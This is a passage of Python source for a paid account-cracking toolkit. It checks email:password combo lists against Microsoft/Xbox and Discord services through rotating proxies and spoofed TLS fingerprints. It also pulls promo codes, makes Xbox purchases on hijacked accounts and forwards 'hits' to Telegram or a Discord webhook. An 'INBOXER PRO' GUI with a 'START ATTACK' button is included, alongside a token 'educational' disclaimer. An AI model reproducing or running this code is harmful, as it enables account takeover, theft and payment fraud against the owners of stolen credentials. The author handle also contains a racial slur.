            accounts = list(set([line.strip() for line in f if line.strip()]))
    except Exception as e:
        show_message(f'Error reading gamepasses.txt: {e}', THEME['error_color'])
        return

    if not accounts:
        show_message('gamepasses.txt is empty!', THEME['error_color'])
        return

    ms_promo_count = 0
    stats = {'checked': 0, 'valid_promos': 0, 'claimed_promos': 0, 'dead': 0, 'errors': 0, 'ineligible': 0, '2fa': 0}
    promo_captures = []
    promo_start_time = time.time()
    cancel_event.clear()
    stop_listening = threading.Event()
    listener_thread = threading.Thread(target=listen_for_cancel_key, args=(cancel_event, stop_listening), daemon=True)
    listener_thread.start()

    proxy_index = 0
    proxy_lock = threading.Lock()

    def get_next_proxy():
        nonlocal proxy_index
        if not proxies:
            return None
        with proxy_lock:
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1
            return proxy

    def process_account(combo):
        if cancel_event.is_set():
            return
        proxy = get_next_proxy() if use_proxies else None
        result = pull_single_promo(combo, proxy=proxy)
        with lock:
            stats['checked'] += 1
            if result['status'] == 'success':
                if result.get('promo_status') == 'valid':
                    stats['valid_promos'] += 1
                    promo_captures.append({'status': 'VALID', 'combo': combo, 'details': f'| Code: {result["code"][:20]}...'})
                elif result.get('already_claimed'):
                    stats['claimed_promos'] += 1
                    promo_captures.append({'status': 'CLAIMED', 'combo': combo, 'details': f'| Code: {result["code"][:20]}...'})
            elif result['status'] == 'dead':
                stats['dead'] += 1
                promo_captures.append({'status': 'DEAD', 'combo': combo, 'details': f'| {result.get("message", "Invalid")[:30]}'})
            elif result['status'] == 'ineligible':
                stats['ineligible'] += 1
                promo_captures.append({'status': 'INELIGIBLE', 'combo': combo, 'details': '| Not eligible'})
            elif result['status'] == '2fa':
                stats['2fa'] += 1
                promo_captures.append({'status': '2FA', 'combo': combo, 'details': '| 2FA Required'})
            else:
                stats['errors'] += 1
                promo_captures.append({'status': 'ERROR', 'combo': combo, 'details': f'| {result.get("message", "Unknown")[:30]}'})

    clear_terminal()
    threads = SETTINGS.get('promo_threads', 10)
    executor = ThreadPoolExecutor(max_workers=threads)

    try:
        # Simple generate function for promo table
        def gen_table():
            s_border = to_rgb_str(THEME['custom_color'])
            content = f'Checked: {stats["checked"]}/{len(accounts)} | Valid: {stats["valid_promos"]} | Claimed: {stats["claimed_promos"]} | Dead: {stats["dead"]} | Errors: {stats["errors"]}'
            return Panel(content, title='[bold]🎮 Discord Promo Puller[/bold]', border_style=s_border)

        with Live(gen_table(), console=console, screen=False, auto_refresh=False) as live:
            for account in accounts:
                if cancel_event.is_set():
                    break
                executor.submit(process_account, account)
            while stats['checked'] < len(accounts):
                if cancel_event.is_set():
                    break
                live.update(gen_table(), refresh=True)
                time.sleep(0.1)
            live.update(gen_table(), refresh=True)
    except Exception:
        pass

    stop_listening.set()
    if not cancel_event.is_set():
        executor.shutdown(wait=True)
    else:
        executor.shutdown(wait=False)

    # Show results
    clear_terminal()
    console.print(f'\nValid: {stats["valid_promos"]} | Claimed: {stats["claimed_promos"]} | Dead: {stats["dead"]} | Errors: {stats["errors"]} | Total: {stats["checked"]}')
    if stats['valid_promos'] > 0:
        console.print('\nValid promos saved to: promos/discord_promos.txt')
    console.print('\n(Press any key to return)')
    get_key()


def run_purchase_automation():
    """Standalone Purchase Automation System"""
    clear_terminal()
    set_title('Anomus - Purchase Automation')
    display_colored_text('╔══════════════════════════════════════════════════════════╗', THEME['start_color'], THEME['end_color'])
    display_colored_text('║           🛒 PURCHASE AUTOMATION 🛒                      ║', THEME['start_color'], THEME['end_color'])
    display_colored_text('╚══════════════════════════════════════════════════════════╝', THEME['start_color'], THEME['end_color'])
    print('\n')

    if not yaml:
        show_message('pyyaml is required for purchase automation.\npip install pyyaml', THEME['error_color'])
        return

    config_path = 'config.yml'
    if not os.path.exists(config_path):
        print('⚠️  config.yml not found! Creating template...')
        create_purchase_config_template()
        show_message('config.yml template created!\n\nPlease edit config.yml then restart.', THEME['error_color'])
        return

    try:
        with open(config_path, 'r') as f:
            config_data = yaml.safe_load(f)
            if not config_data or 'data' not in config_data:
                raise ValueError('Invalid config format')
            config = config_data['data']
    except Exception as e:
        show_message(f'Error loading config.yml: {e}', THEME['error_color'])
        return

    required_fields = ['productId', 'skuId', 'receiveMail']
    missing = [f for f in required_fields if f not in config or not config[f]]
    if missing:
        show_message(f'Missing required config fields: {", ".join(missing)}', THEME['error_color'])
        return

    print(f'   Product ID: {config["productId"]}')
    print(f'   SKU ID: {config["skuId"]}')
    print(f'   Receiver Email: {config["receiveMail"]}')

    filepath = open_file_dialog('Select your accounts file (email:password)')
    if not filepath:
        show_message('Operation cancelled.', THEME['error_color'])
        return

    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        show_message(f'Error reading accounts file: {e}', THEME['error_color'])
        return

    if not accounts:
        show_message('No valid accounts found in file.', THEME['error_color'])
        return

    clear_terminal()
    display_colored_text(f'Starting purchase on {len(accounts)} accounts...', THEME['start_color'], THEME['end_color'])
    print('\n')

    # Ensure proxy is loaded from settings for auth if set
    proxy_settings = None
    if SETTINGS.get('proxy'):
        # For simplicity, just use the first proxy if it's a list
        proxy_str = SETTINGS['proxy'][0] if isinstance(SETTINGS['proxy'], list) else SETTINGS['proxy']
        parsed_proxy = parse_proxy(proxy_str)
        if 'error' not in parsed_proxy:
            proxy_url = 'http://'
            if parsed_proxy.get('user') and parsed_proxy.get('pass'):
                proxy_url += f'{parsed_proxy["user"]}:{parsed_proxy["pass"]}@'
            proxy_url += f'{parsed_proxy["host"]}:{parsed_proxy["port"]}'
            proxy_settings = {'http': proxy_url, 'https': proxy_url}

    success_count = 0
    fail_count = 0

    for account in accounts:
        try:
            email, password = account.split(':', 1)
        except ValueError:
            continue

        print(f'[{email}] Authenticating...')
        # We need to get Xbox Live Tokens
        try:
            sess = tls_client.Session(client_identifier="chrome_110", random_tls_extension_order=True) if tls_client else requests.Session()
            if proxy_settings:
                sess.proxies = proxy_settings

            # 1. Login to Live
            live_login_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = sess.get(live_login_url, timeout=15)
            # Find the login post url (PPFT)
            sFTTag = ""
            urlPost = ""
            response_text = resp.text

            serverdata_match = re.search(r'var ServerData = ({.*?});', response_text, re.DOTALL)
            if serverdata_match:
                try:
                    import json
                    server_data = json.loads(serverdata_match.group(1))
                    if 'sFTTag' in server_data:
                        ftag = server_data['sFTTag']
                        ppft_match = re.search(r'value="([^"]+)"', ftag)
                        if ppft_match:
                            sFTTag = ppft_match.group(1)
                    if 'urlPost' in server_data:
                        urlPost = server_data['urlPost']
                except Exception:
                    pass

            if not sFTTag:
                ppft_match = re.search(r'"sFTTag":"[^"]*value=\\\"([^"\\]+)\\\"', response_text)
                if ppft_match:
                    sFTTag = ppft_match.group(1)
            if not urlPost:
                urlpost_match = re.search(r'"urlPost":"([^"]+)"', response_text)
                if urlpost_match:
                    urlPost = urlpost_match.group(1)

            if not sFTTag or not urlPost:
                try:
                    if not sFTTag:
                        sFTTag = response_text.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
                    if not urlPost:
                        urlPost = response_text.split("urlPost:'")[1].split("'")[0]
                except Exception:
                    pass
            
            if not sFTTag or not urlPost:
                print(f'[{email}] \033[91mFailed to get PPFT\033[0m')
                fail_count += 1
                continue

            data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sFTTag
            }
            post_resp = sess.post(urlPost, data=data, timeout=15)
            
            access_token = ""
            if "access_token=" in post_resp.url:
                access_token = post_resp.url.split("access_token=")[1].split("&")[0]
            elif post_resp.status_code in [302, 301]:
                redirect_url = post_resp.headers.get("Location", "")
                if "access_token=" in redirect_url:
                    access_token = redirect_url.split("access_token=")[1].split("&")[0]

            if not access_token:
                # Try getting from redirects manually
                for r in post_resp.history:
                    if r.headers.get('Location') and 'access_token=' in r.headers['Location']:
                        access_token = r.headers['Location'].split("access_token=")[1].split("&")[0]
                        break

            if not access_token:
                print(f'[{email}] \033[91mLogin Failed (Bad credentials or MFA)\033[0m')
                fail_count += 1
                continue

            # 2. XBL Auth
            j = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": access_token
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            xbl = sess.post("https://user.auth.xboxlive.com/user/authenticate", json=j, headers={"Content-Type": "application/json", "x-xbl-contract-version": "1"}, timeout=15)
            if xbl.status_code != 200:
                print(f'[{email}] \033[91mXBL Auth Failed\033[0m')
                fail_count += 1
                continue
            
            xbl_json = xbl.json()
            xbox_token = xbl_json.get("Token")
            uhs = xbl_json.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")

            # 3. XSTS Auth (for purchase)
            j2 = {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbox_token]
                },
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT"
            }
            xsts = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize", json=j2, headers={"Content-Type": "application/json", "x-xbl-contract-version": "1"}, timeout=15)
            
            if xsts.status_code == 401:
                print(f'[{email}] \033[91mNo Xbox Account Created\033[0m')
                fail_count += 1
                continue
            elif xsts.status_code != 200:
                print(f'[{email}] \033[91mXSTS Auth Failed\033[0m')
                fail_count += 1
                continue
            
            xsts_token = xsts.json().get("Token")

            # 4. Make Purchase
            print(f'[{email}] Tokens acquired. Attempting purchase...')
            purchase_headers = {
                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                "Content-Type": "application/json",
                "x-xbl-contract-version": "1"
            }
            purchase_payload = {
                "purchaseRequest": {
                    "productId": config["productId"],
                    "skuId": config["skuId"],
                    "quantity": 1
                }
            }
            # Note: This uses standard Xbox v7.0 purchase API. Actual endpoints might vary depending on whether it's MS Store or Xbox Store specifically.
            purchase_resp = requests.post("https://purchase.xboxlive.com/v7.0/purchases", headers=purchase_headers, json=purchase_payload, proxies=proxy_settings, timeout=20)
            
            if purchase_resp.status_code in [200, 201, 202]:
                print(f'[{email}] \033[92mPurchase Success!\033[0m')
                write_to_file_no_duplicates("results/purchased_items.txt", f"{email}:{password} | Product: {config['productId']} | Request Success")
                success_count += 1
            else:
                print(f'[{email}] \033[91mPurchase Failed! HTTP {purchase_resp.status_code}\033[0m')
                try:
                    err_json = purchase_resp.json()
                    print(f'   Reason: {err_json.get("code", "Unknown")} - {err_json.get("description", "")}')
                except Exception:
                    pass
                fail_count += 1

        except Exception as e:
            print(f'[{email}] \033[91mError: {e}\033[0m')
            fail_count += 1

    show_message(f'Purchase automation complete.\nSuccess: {success_count}\nFailed: {fail_count}', THEME['about_color'])


def create_purchase_config_template():
    template = '# Purchase Automation Configuration\ndata:\n  productId: "9NBLGGH4TNMP"\n  skuId: "0010"\n  receiveMail: "your-email@example.com"\n'
    try:
        with open('config.yml', 'w') as f:
            f.write(template)
    except Exception as e:
        print(f'Error creating config.yml: {e}')


def run_disclaimer_screen():
    clear_terminal()
    disclaimer_text = 'This tool is for educational purposes ONLY.\nThe developer assumes no liability for misuse.'
    options = ['I AGREE', 'Exit']
    selected = 0
    while True:
        clear_terminal()
        display_colored_text(WARNING_ASCII, THEME['disclaimer_start'], THEME['disclaimer_end'])
        display_colored_text(disclaimer_text, THEME['disclaimer_start'], THEME['disclaimer_end'])
        print('\n')
        parts = [f'\033[7m {opt} \033[0m' if i == selected else f' {opt} ' for i, opt in enumerate(options)]
        print(center_multiline('  '.join(parts)))
        key = get_key()
        if key in (Key.LEFT, Key.RIGHT):
            selected = 1 - selected
        elif key == Key.ENTER:
            if selected == 0:
                write_disclaimer_acceptance()
                return
            else:
                clear_terminal()
                print('Exiting...'.center(shutil.get_terminal_size().columns))
                sys.exit()


def run_proxy_submenu(is_fancy):
    selected, frame = 0, 0
    while True:
        menu_options = ['Set Single Proxy', 'Load Proxies From File', 'Test Proxies', 'Clear Proxies', 'Back']
        display_menu('Proxy Settings', menu_options, selected, frame, is_fancy)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                proxy_input = get_user_input('Enter new proxy (e.g., user:pass@host:port):')
                SETTINGS['proxy'] = proxy_input if proxy_input else None
                save_settings()
                show_message('Single proxy setting updated.')
            elif selected == 1:
                filepath = open_file_dialog('Select your proxy file')
                if filepath:
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            proxies = [line.strip() for line in f if line.strip()]
                        if proxies:
                            SETTINGS['proxy'] = proxies
                            save_settings()
                            show_message(f'Loaded {len(proxies)} proxies.')
                        else:
                            show_message('File is empty.', THEME['error_color'])
                    except Exception as e:
                        show_message(f'Error reading file: {e}', THEME['error_color'])
            elif selected == 2:
                run_proxy_tester()
            elif selected == 3:
                SETTINGS['proxy'] = None
                save_settings()
                show_message('Proxy settings cleared.')
            elif selected == 4:
                return
        frame += 1
        time.sleep(0.01)


def run_thread_settings_submenu(is_fancy):
    selected, frame = 0, 0
    while True:
        menu_options = [
            f'Set Checker Threads (Current: {SETTINGS.get("checker_threads", 25)})',
            f'Set Proxy Tester Threads (Current: {SETTINGS.get("proxy_threads", 100)})',
            f'Set Promo Puller Threads (Current: {SETTINGS.get("promo_threads", 10)})',
            'Back',
        ]
        display_menu('Thread Settings', menu_options, selected, frame, is_fancy)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                threads = get_user_input('Enter number of threads for the checker:')
                try:
                    SETTINGS['checker_threads'] = max(1, int(threads))
                    save_settings()
                    show_message(f'Checker threads set to {SETTINGS["checker_threads"]}.')
                except ValueError:
                    show_message('Invalid number.', THEME['error_color'])
            elif selected == 1:
                threads = get_user_input('Enter number of threads for the proxy tester:')
                try:
                    SETTINGS['proxy_threads'] = max(1, int(threads))
                    save_settings()
                    show_message(f'Proxy tester threads set to {SETTINGS["proxy_threads"]}.')
                except ValueError:
                    show_message('Invalid number.', THEME['error_color'])
            elif selected == 2:
                threads = get_user_input('Enter number of threads for the promo puller:')
                try:
                    SETTINGS['promo_threads'] = max(1, min(50, int(threads)))
                    save_settings()
                    show_message(f'Promo puller threads set to {SETTINGS["promo_threads"]}.')
                except ValueError:
                    show_message('Invalid number.', THEME['error_color'])
            elif selected == 3:
                return
        frame += 1
        time.sleep(0.01)


def test_hit_senders():
    sender_config = SETTINGS.get('hit_sender', {})
    enabled_service = sender_config.get('enabled', 'None')
    if enabled_service == 'None':
        show_message('No hit sender is enabled in settings.', THEME['error_color'])
    else:
        test_capture = {'combo': 'test@example.com:password', 'orders': 5, 'xbox': 'Yes', 'minecraft': 'Yes', 'refundable': 2}
        with console.status(f'[bold orange_red1]Sending a test message to {enabled_service}...[/]', spinner='dots'):
            open(HIT_SENDER_LOG_FILE, 'w').close()
            send_hit(test_capture)
            time.sleep(3)
        log_content = ''
        try:
            with open(HIT_SENDER_LOG_FILE, 'r', encoding='utf-8') as f:
                log_content = f.read()
        except IOError:
            pass
        if 'Successfully sent hit' in log_content:
            show_message(f'Test message sent successfully to {enabled_service}!', THEME['success_color'])
        else:
            show_message(f'Failed to send test message to {enabled_service}.', THEME['error_color'])


def run_hit_sender_submenu(is_fancy):
    selected, frame = 0, 0
    while True:
        sender_config = SETTINGS.get('hit_sender', {})
        status = sender_config.get('enabled', 'None')
        menu_options = [
            f'Status: {status}',
            f'Set Telegram Token ({"Set" if sender_config.get("telegram_token") else "Not Set"})',
            f'Set Telegram Chat ID ({"Set" if sender_config.get("telegram_chat_id") else "Not Set"})',
            f'Set Discord Webhook ({"Set" if sender_config.get("discord_webhook") else "Not Set"})',
            'Test Hit Senders',
            'Back',
        ]
        display_menu('Hit Sender Settings', menu_options, selected, frame, is_fancy)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                current_status_index = ['None', 'Telegram', 'Discord'].index(status)
                new_status_index = (current_status_index + 1) % 3
                sender_config['enabled'] = ['None', 'Telegram', 'Discord'][new_status_index]
                save_settings()
            elif selected == 1:
                token = get_user_input('Enter New Telegram Bot Token:', is_password=True)
                sender_config['telegram_token'] = token if token else None
                save_settings()
                show_message('Telegram Token updated.')
            elif selected == 2:
                chat_id = get_user_input('Enter New Telegram Chat ID:')
                sender_config['telegram_chat_id'] = chat_id if chat_id else None
                save_settings()
                show_message('Telegram Chat ID updated.')
            elif selected == 3:
                webhook = get_user_input('Enter New Discord Webhook URL:', is_password=True)
                sender_config['discord_webhook'] = webhook if webhook else None
                save_settings()
                show_message('Discord Webhook updated.')
            elif selected == 4:
                test_hit_senders()
            elif selected == 5:
                return
        frame += 1
        time.sleep(0.01)


def run_license_settings_menu(is_fancy):
    set_title('Anomus - License Settings')
    selected, frame = 0, 0
    while True:
        license_info = license_client.get_cached_license_info()
        if license_info:
            is_expired = license_info.get('is_expired', False)
            expires = license_info.get('expires', 'Never')
            if is_expired:
                status = '⚠ Expired'
            elif expires != 'Never':
                try:
                    expiry_date = datetime.fromisoformat(expires.replace('Z', '+00:00'))
                    days_left = (expiry_date - datetime.now()).days
                    status = f'⚠ Expires in {days_left}d' if days_left <= 7 else '✓ Active'
                except:
                    status = '✓ Active'
            else:
                status = '✓ Active'
        else:
            status = '✗ No License'

        menu_options = [f'View License Info ({status})', 'Change License Key', 'Clear License Cache', 'Back']
        display_menu('License Settings', menu_options, selected, frame, is_fancy)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                clear_terminal()
                if license_info:
                    info_text = f'\nLicense Status: {"✗ EXPIRED" if license_info.get("is_expired") else "✓ ACTIVE"}\nKey: {license_info.get("key", "N/A")}\nExpires: {license_info.get("expires", "Never")}\n'
                    display_colored_text(info_text, THEME['success_color'], THEME['success_color'])
                else:
                    display_colored_text('\nNo license found.\n', THEME['error_color'], THEME['error_color'])
                get_key()
            elif selected == 1:
                new_key = get_user_input('Enter new license key:')
                if new_key:
                    license_client.deactivate()
                    result = license_client.activate(new_key)
                    success, message = result[0], result[1]
                    if success:
                        show_message(f'✓ {message}', THEME['success_color'])
                    else:
                        show_message(f'✗ {message}', THEME['error_color'])
            elif selected == 2:
                license_client.deactivate()
                show_message('License cache cleared.', THEME['success_color'])
            elif selected == 3:
                return
        frame += 1
        time.sleep(0.01)


def run_settings_menu(is_fancy):
    set_title('Anomus - Settings')
    selected, frame = 0, 0
    while True:
        proxy_info = SETTINGS.get('proxy')
        number = len(proxy_info) if isinstance(proxy_info, list) else (1 if isinstance(proxy_info, str) else 0)
        menu_options = [f'Proxy Settings (Current: {number})', 'Hit Sender Settings', 'Thread Settings', 'License Settings', 'Back']
        display_menu('Settings', menu_options, selected, frame, is_fancy)
        key = get_key()
        if key == Key.UP:
            selected = (selected - 1) % len(menu_options)
        elif key == Key.DOWN:
            selected = (selected + 1) % len(menu_options)
        elif key == Key.ENTER:
            if selected == 0:
                run_proxy_submenu(is_fancy)
            elif selected == 1:
                run_hit_sender_submenu(is_fancy)
            elif selected == 2:
                run_thread_settings_submenu(is_fancy)
            elif selected == 3:
                run_license_settings_menu(is_fancy)
            elif selected == 4:
                return
        frame += 1
        time.sleep(0.01)


def run_license_screen():
    """Display license activation screen"""
    license_info = license_client.get_license_info()
    if license_info:
        clear_terminal()
        display_colored_text(BANNER, THEME['start_color'], THEME['end_color'])
        display_colored_text(f'\n✓ VALID LICENSE FOUND!\n\nPress ENTER to continue...\n', THEME['success_color'], THEME['success_color'])
        key = get_key()
        if key == Key.ENTER:
            return

    selected = 0
    while True:
        clear_terminal()
        display_colored_text(BANNER, THEME['start_color'], THEME['end_color'])
        info_text = f'\nThis tool requires a valid license.\n\nYour HWID: {license_client.hwid[:24]}...\n\nPurchase: https://anomus.mysellauth.com\n'
        display_colored_text(info_text, THEME['disclaimer_start'], THEME['disclaimer_end'])
        print('\n')
        options = ['Enter License Key', 'Exit']
        parts = [f'\033[7m {opt} \033[0m' if i == selected else f' {opt} ' for i, opt in enumerate(options)]
        print(center_multiline('  '.join(parts)))
        key = get_key()
        if key in (Key.LEFT, Key.RIGHT):
            selected = 1 - selected
        elif key == Key.ENTER:
            if selected == 0:
                license_key = get_user_input('Enter your license key:')
                if license_key:
                    display_colored_text('Validating license...', THEME['highlight_fg'], THEME['highlight_fg'])
                    result = license_client.activate(license_key)
                    success, message = result[0], result[1]
                    time.sleep(1)
                    if success:
                        show_message(f'✓ {message}', THEME['success_color'])
                        return
                    else:
                        show_message(f'✗ {message}', THEME['error_color'])
            else:
                clear_terminal()
                print('Exiting...'.center(shutil.get_terminal_size().columns))
                sys.exit()



class InboxerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.config_path = "config.json"
        self.title("Hotmail Inboxer [PAID] - @nigrofr")
        self.geometry("800x650")
        self.minsize(800, 650)
        
        # Grid layout for the main window
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.is_running = False
        self.combo_file = ""
        self.proxies_file = ""
        
        self.mwRetries = 99999999999
        self.anasHitsFiles = "Hotmail-Hits.txt"
        self.anasCustomFiles = "Hotmail-Custom.txt"
        
        self.stats = {'Hits': 0, 'Bad': 0, 'Custom': 0, 'Retries': 0}
        self.lock = threading.Lock()
        
        self.anasComboQueue = Queue()
        self.anasProxyQueue = Queue()
        self.log_queue = queue.Queue()
        self.threads_list = []
        
        self.total_combos_loaded = 0
        self.combos_processed = 0

        self._create_widgets()
        self._load_config()
        self.after(100, self._process_log_queue)

    def _create_widgets(self):
        # ----------------SIDEBAR----------------
        self.sidebar_frame = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure(5, weight=1)
        
        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="INBOXER PRO", font=ctk.CTkFont(size=20, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
        
        # Files config
        self.btn_combo = ctk.CTkButton(self.sidebar_frame, text="Load Combo", command=self._select_combo, fg_color="#333333", hover_color="#555555")
        self.btn_combo.grid(row=1, column=0, padx=20, pady=10)
        self.lbl_combo = ctk.CTkLabel(self.sidebar_frame, text="No Combo Selected", text_color="gray", font=ctk.CTkFont(size=10))
        self.lbl_combo.grid(row=2, column=0, padx=20, pady=(0, 10))
        
        self.btn_proxies = ctk.CTkButton(self.sidebar_frame, text="Load Proxies", command=self._select_proxies, fg_color="#333333", hover_color="#555555")
        self.btn_proxies.grid(row=3, column=0, padx=20, pady=10)
        self.lbl_proxies = ctk.CTkLabel(self.sidebar_frame, text="No Proxies Selected", text_color="gray", font=ctk.CTkFont(size=10))
        self.lbl_proxies.grid(row=4, column=0, padx=20, pady=(0, 10))
        
        # Credits/Author
        self.author_lbl = ctk.CTkLabel(self.sidebar_frame, text="@nigrofr\nHotmail Inboxer V2", text_color="#666666", font=ctk.CTkFont(size=10))
        self.author_lbl.grid(row=6, column=0, padx=20, pady=20, sticky="s")


        # ----------------MAIN CONTENT----------------
        # Top Config Frame
        self.config_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.config_frame.grid(row=0, column=1, padx=20, pady=(20, 0), sticky="new")
        self.config_frame.grid_columnconfigure(1, weight=1)
        
        self.keyword_lbl = ctk.CTkLabel(self.config_frame, text="Target Keyword:")
        self.keyword_lbl.grid(row=0, column=0, padx=(0, 10), pady=0, sticky="w")
        
        self.ent_keyword = ctk.CTkEntry(self.config_frame, placeholder_text="e.g. Playstation Sony")
        self.ent_keyword.grid(row=0, column=1, padx=0, pady=0, sticky="ew")
        
        self.threads_lbl = ctk.CTkLabel(self.config_frame, text="Threads:")
        self.threads_lbl.grid(row=0, column=2, padx=(20, 10), pady=0, sticky="w")
        
        self.ent_threads = ctk.CTkEntry(self.config_frame, width=60)
        self.ent_threads.insert(0, "40")
        self.ent_threads.grid(row=0, column=3, padx=0, pady=0, sticky="e")
        
        self.proxy_type_lbl = ctk.CTkLabel(self.config_frame, text="Proxy Type:")
        self.proxy_type_lbl.grid(row=0, column=4, padx=(20, 10), pady=0, sticky="w")
        
        self.proxy_type_var = ctk.StringVar(value="HTTP")
        self.dropdown_proxy = ctk.CTkOptionMenu(self.config_frame, values=["HTTP", "SOCKS4", "SOCKS5"], variable=self.proxy_type_var, width=100)
        self.dropdown_proxy.grid(row=0, column=5, padx=0, pady=0, sticky="e")
        
        
        # ----------------STATS FRAME----------------
        self.stats_frame = ctk.CTkFrame(self)
        self.stats_frame.grid(row=1, column=1, padx=20, pady=20, sticky="ew")
        self.stats_frame.grid_columnconfigure((0, 1, 2, 3), weight=1)
        
        self.lbl_hits = ctk.CTkLabel(self.stats_frame, text="Hits: 0", font=ctk.CTkFont(size=16, weight="bold"), text_color="#10B981") # Emerald Green
        self.lbl_hits.grid(row=0, column=0, padx=10, pady=15)
        
        self.lbl_custom = ctk.CTkLabel(self.stats_frame, text="Custom: 0", font=ctk.CTkFont(size=16, weight="bold"), text_color="#3B82F6") # Blue
        self.lbl_custom.grid(row=0, column=1, padx=10, pady=15)
        
        self.lbl_bad = ctk.CTkLabel(self.stats_frame, text="Bad: 0", font=ctk.CTkFont(size=16, weight="bold"), text_color="#EF4444") # Red
        self.lbl_bad.grid(row=0, column=2, padx=10, pady=15)
        
        self.lbl_retries = ctk.CTkLabel(self.stats_frame, text="Retries: 0", font=ctk.CTkFont(size=16, weight="bold"), text_color="#F59E0B") # Amber
        self.lbl_retries.grid(row=0, column=3, padx=10, pady=15)
        
        # ----------------PROGRESS BAR----------------
        self.progress_bar = ctk.CTkProgressBar(self.stats_frame, mode="determinate")
        self.progress_bar.grid(row=1, column=0, columnspan=4, padx=20, pady=(0, 15), sticky="ew")
        self.progress_bar.set(0)
        
        # ----------------CONSOLE LOG----------------
        self.log_area = ctk.CTkTextbox(self, font=ctk.CTkFont("Consolas", size=11))
        self.log_area.grid(row=2, column=1, padx=20, pady=0, sticky="nsew")
        self.log_area.insert("0.0", "Welcome to Hotmail Inboxer Pro.\nLoad your configuration and start...\n\n")


        # ----------------CONTROL BUTTONS----------------
        self.controls_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.controls_frame.grid(row=3, column=1, padx=20, pady=20, sticky="sew")
        self.controls_frame.grid_columnconfigure((0, 1), weight=1)
        
        self.btn_start = ctk.CTkButton(self.controls_frame, text="START ATTACK", fg_color="#10B981", hover_color="#059669", font=ctk.CTkFont(weight="bold"), height=40, command=self._start_checking)
        self.btn_start.grid(row=0, column=0, padx=(0, 10), pady=0, sticky="ew")
        
        self.btn_stop = ctk.CTkButton(self.controls_frame, text="ABORT", state="disabled", fg_color="#EF4444", hover_color="#DC2626", font=ctk.CTkFont(weight="bold"), height=40, command=self._stop_checking)
        self.btn_stop.grid(row=0, column=1, padx=(10, 0), pady=0, sticky="ew")
        
    def _select_combo(self):
        filename = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.combo_file = filename
            short_name = filename.split('/')[-1] if '/' in filename else filename.split('\\')[-1]
            self.lbl_combo.configure(text=short_name[:20] + "..." if len(short_name) > 20 else short_name)

    def _select_proxies(self):
        filename = filedialog.askopenfilename(title="Select Proxies File", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.proxies_file = filename
            short_name = filename.split('/')[-1] if '/' in filename else filename.split('\\')[-1]
            self.lbl_proxies.configure(text=short_name[:20] + "..." if len(short_name) > 20 else short_name)

    def _save_config(self):
        config_data = {
            "combo_file": self.combo_file,
            "proxies_file": self.proxies_file,
            "keyword": self.ent_keyword.get().strip(),
            "threads": self.ent_threads.get().strip(),
            "proxy_type": self.proxy_type_var.get()
        }
        with open(self.config_path, 'w', encoding='utf-8') as f:
            json.dump(config_data, f)

    def _load_config(self):
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r', encoding='utf-8') as f:
                    config_data = json.load(f)
                    
                self.combo_file = config_data.get("combo_file", "")
                if self.combo_file:
                    short_name = self.combo_file.split('/')[-1] if '/' in self.combo_file else self.combo_file.split('\\')[-1]
                    self.lbl_combo.configure(text=short_name[:20] + "..." if len(short_name) > 20 else short_name)
                    
                self.proxies_file = config_data.get("proxies_file", "")
                if self.proxies_file:
                    short_name = self.proxies_file.split('/')[-1] if '/' in self.proxies_file else self.proxies_file.split('\\')[-1]
                    self.lbl_proxies.configure(text=short_name[:20] + "..." if len(short_name) > 20 else short_name)
                    
                if config_data.get("keyword"):
                    self.ent_keyword.delete(0, "end")
                    self.ent_keyword.insert(0, config_data["keyword"])
                    
                if config_data.get("threads"):
                    self.ent_threads.delete(0, "end")
                    self.ent_threads.insert(0, config_data["threads"])
                    
                if config_data.get("proxy_type"):
                    self.proxy_type_var.set(config_data["proxy_type"])
                    
            except Exception:
                pass

    def _log(self, message):
        self.log_queue.put(message)

    def _process_log_queue(self):
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_area.insert("end", msg + "\n")
                self.log_area.see("end")
                self.log_queue.task_done()
        except queue.Empty:
            pass
            
        # Update stats
        with self.lock:
            self.lbl_hits.configure(text=f"Hits: {self.stats['Hits']}")
